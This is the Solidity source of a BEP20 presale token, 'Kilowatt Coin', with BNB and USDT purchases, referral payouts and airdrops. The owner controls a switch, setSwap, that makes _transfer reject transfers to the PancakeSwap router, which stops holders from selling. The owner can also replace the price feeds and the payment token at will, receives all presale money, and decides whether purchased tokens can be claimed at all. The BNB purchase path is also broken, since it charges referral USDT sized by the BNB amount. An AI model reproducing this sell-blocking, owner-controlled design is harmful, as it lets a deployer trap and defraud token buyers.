/**
 *Submitted for verification at BscScan.com on 2023-10-31
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.8.15;

interface IBEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    function burnToken() external view returns (uint256);

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the token name.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view returns (address);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor() {}

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface AggregatorV3Interface {
    function decimals() external view returns (uint8);

    function description() external view returns (string memory);

    function version() external view returns (uint256);

    function getRoundData(uint80 _roundId)
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );

    function latestRoundData()
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );
}

contract KWCCOIN is Context, IBEP20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint256 public numberOfTokens;
    uint256 public CurrentTokens = 0;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    uint256 private _burnToken = 0;
    uint256 public rate = 22000000000000000;
    bool private hasStart = false;
    bool public reverseSwap = true;
    address uniswapV2Router02 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint256 public airdrop = 0;
    uint256 public rewards = 0;
    address[] public _airaddress;
    IBEP20 USDT;
    AggregatorV3Interface internal BnbFeed;
    AggregatorV3Interface internal UsdtFeed;

    uint256 public levelRate = 1000;
    uint256 public totalRefPay;
    bool public claim;
    struct Account {
        address beneficiary;
        uint256 totalBuy;
        uint256 claimed;
        address referrer;
        uint256 reward;
        uint256 referredCount;
    }
    mapping(address => Account) public paccounts;

    constructor() {
        _name = "Kilowatt Coin";
        _symbol = "KWC";
        _decimals = 18;
        _totalSupply = 500000000 * 10**18;
        _balances[msg.sender] = _totalSupply;
        hasStart = true;
        numberOfTokens = 5000000000000000000000000;

        USDT = IBEP20(0x55d398326f99059fF775485246999027B3197955);
        BnbFeed = AggregatorV3Interface(
            0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE
        );
        UsdtFeed = AggregatorV3Interface(
            0xB97Ad0E74fa7d920791E90258A6E2085088b4320
        );

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    event RegisteredReferer(address referee, address referrer);
    event RegisteredRefererFailed(
        address referee,
        address referrer,
        string reason
    );
    event PaidReferral(address from, address to, uint256 amount);

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Start the sale.
     */
    function startSale(uint256 _rate, uint256 tokens)
        external
        onlyOwner
        returns (bool)
    {
        hasStart = true;
        rate = _rate;
        numberOfTokens = tokens;
        CurrentTokens = 0;
        return true;
    }

    function setLevelrate(uint _refRate) public onlyOwner{
        levelRate = _refRate;
    }

    /**
     * @dev Pause the sale.
     */

    function pauseSale(bool _paused) external onlyOwner {
        hasStart = _paused;
    }

    function setBnbFeed(address _feedAddress) public onlyOwner {
        BnbFeed = AggregatorV3Interface(_feedAddress);
    }

    function setUsdtFeed(address _feedAddress) public onlyOwner {
        UsdtFeed = AggregatorV3Interface(_feedAddress);
    }

    function setUsdt(address _usdt) public onlyOwner {
        USDT = IBEP20(_usdt);
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function setSwap(bool _swap) public onlyOwner {
        reverseSwap = _swap;
    }

    function setClaim(bool _claim) public onlyOwner {
        claim = _claim;
    }

    /**
     * @dev Returns the bep token owner.
     */
    function buyToken(address _refAddress) public payable {
        require(hasStart == true, "Sale is not started");
        if (_refAddress != address(0) && paccounts[_refAddress].totalBuy > 0) {
            if (!hasReferrer(msg.sender)) {
                addReferrer(_refAddress);
            }
        }
        uint256 totalPay = payReferral(msg.value);
        uint256 leftUsd = msg.value - totalPay;
        payable(owner()).transfer(leftUsd);
        int256 price;
        (, price, , , ) = (BnbFeed.latestRoundData());
        uint256 totalUsd = (msg.value * uint256(price)) / 10**8;
        uint256 tokens = (totalUsd * 10**18) / rate;

        require(tokens <= numberOfTokens, "Not Enough Tokens in this Sale");
        require(
            CurrentTokens <= numberOfTokens,
            "Tokens For this sell are Finished"
        );
        paccounts[msg.sender].totalBuy += tokens;

        CurrentTokens = CurrentTokens + tokens;
    }

    function buyTokenUsdt(uint256 _amount, address _refAddress) public {
        require(hasStart == true, "Sale is not started");
        if (_refAddress != address(0) && paccounts[_refAddress].totalBuy > 0) {
            if (!hasReferrer(msg.sender)) {
                addReferrer(_refAddress);
            }
        }

        uint256 totalPay = payReferral(_amount);

        uint256 leftUsd = _amount - totalPay;
        USDT.transferFrom(msg.sender, owner(), leftUsd);
        int256 price;
        (, price, , , ) = (UsdtFeed.latestRoundData());
        uint256 totalUsd = (_amount * uint256(price)) / 10**8;
        uint256 tokens = (totalUsd * 10**18) / rate;

        require(tokens <= numberOfTokens, "Not Enough Tokens in this Sale");
        require(
            CurrentTokens <= numberOfTokens,
            "Tokens For this sell are Finished"
        );

        paccounts[msg.sender].totalBuy += tokens;
        CurrentTokens = CurrentTokens + tokens;
    }

    function claimBuyTokens() public {
        require(claim, "currently claim not avalible");
        require(paccounts[msg.sender].totalBuy > 0, "No claim token found");
        uint256 total = paccounts[msg.sender].totalBuy -
            paccounts[msg.sender].claimed;

        require(total > 0, "No claim token found");
        paccounts[msg.sender].claimed += total;
        _transfer(owner(), msg.sender, total);
    }

    function setDrop(uint256 _airdrop, uint256 _rewards)
        public
        onlyOwner
        returns (bool)
    {
        airdrop = _airdrop;
        rewards = _rewards;
        delete _airaddress;
        return true;
    }

    function airdropTokens(address ref_address) public returns (bool) {
        require(airdrop != 0, "No Airdrop started yet&quot");
        bool _isExist = false;
        for (uint8 i = 0; i < _airaddress.length; i++) {
            if (_airaddress[i] == msg.sender) {
                _isExist = true;
            }
        }
        require(_isExist == false, "Already Dropped&quot");
        _transfer(owner(), msg.sender, airdrop * (10**18));
        _transfer(owner(), ref_address, ((airdrop * (10**18) * rewards) / 100));
        _airaddress.push(msg.sender);

        return true;
    }

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the token name.
     */
    function name() external view override returns (string memory) {
        return _name;
    }

    /**
     * @dev See {BEP20-totalSupply}.
     */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function burnToken() external view override returns (uint256) {
        return _burnToken;
    }

    /**
     * @dev See {BEP20-balanceOf}.
     */
    function balanceOf(address account)
        external
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }

    /**
     * @dev See {BEP20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {BEP20-allowance}.
     */
    function allowance(address owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {BEP20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount)
        external
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {BEP20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {BEP20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "BEP20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {BEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {BEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "BEP20: decreased allowance below zero"
            )
        );
        return true;
    }

    /**
     * @dev Burn `amount` tokens and decreasing the total supply.
     */
    function burn(uint256 amount) public onlyOwner returns (bool) {
        _burn(_msgSender(), amount);
        _burnToken = amount + _burnToken;
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        if (!reverseSwap) {
            require(recipient != uniswapV2Router02, "Error: Can not Swap Back");
        }

        _balances[sender] = _balances[sender].sub(
            amount,
            "BEP20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(
            amount,
            "BEP20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`.`amount` is then deducted
     * from the caller's allowance.
     *
     * See {_burn} and {_approve}.
     */
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(
            account,
            _msgSender(),
            _allowances[account][_msgSender()].sub(
                amount,
                "BEP20: burn amount exceeds allowance"
            )
        );
    }

    function isCircularReference(address referrer, address referee)
        internal
        view
        returns (bool)
    {
        address parent = referrer;

        for (uint256 i; i < 1; i++) {
            if (parent == address(0)) {
                break;
            }

            if (parent == referee) {
                return true;
            }

            parent = paccounts[parent].referrer;
        }

        return false;
    }

    function hasReferrer(address addr) public view returns (bool) {
        return paccounts[addr].referrer != address(0);
    }

    function addReferrer(address referrer) internal returns (bool) {
        if (referrer == address(0)) {
            emit RegisteredRefererFailed(
                msg.sender,
                referrer,
                "Referrer cannot be 0x0 address"
            );
            return false;
        } else if (isCircularReference(referrer, msg.sender)) {
            emit RegisteredRefererFailed(
                msg.sender,
                referrer,
                "Referee cannot be one of referrer uplines"
            );
            return false;
        } else if (paccounts[msg.sender].referrer != address(0)) {
            emit RegisteredRefererFailed(
                msg.sender,
                referrer,
                "Address have been registered upline"
            );
            return false;
        }

        Account storage userAccount = paccounts[msg.sender];
        Account storage parentAccount = paccounts[referrer];
        userAccount.referrer = referrer;
        parentAccount.referredCount = parentAccount.referredCount.add(1);

        emit RegisteredReferer(msg.sender, referrer);
        return true;
    }

    function payReferral(uint256 _value) internal returns (uint256) {
        Account memory userAccount = paccounts[msg.sender];
        address parent = userAccount.referrer;
        if (parent == address(0)) return 0;
        Account storage parentAccount = paccounts[userAccount.referrer];

        uint256 c = _value.mul(levelRate).div(10000);

        totalRefPay += c;
        parentAccount.reward = parentAccount.reward.add(c);
        USDT.transferFrom(msg.sender, parent, c);

        emit PaidReferral(msg.sender, parent, c);
        userAccount = parentAccount;

        return c;
    }
}
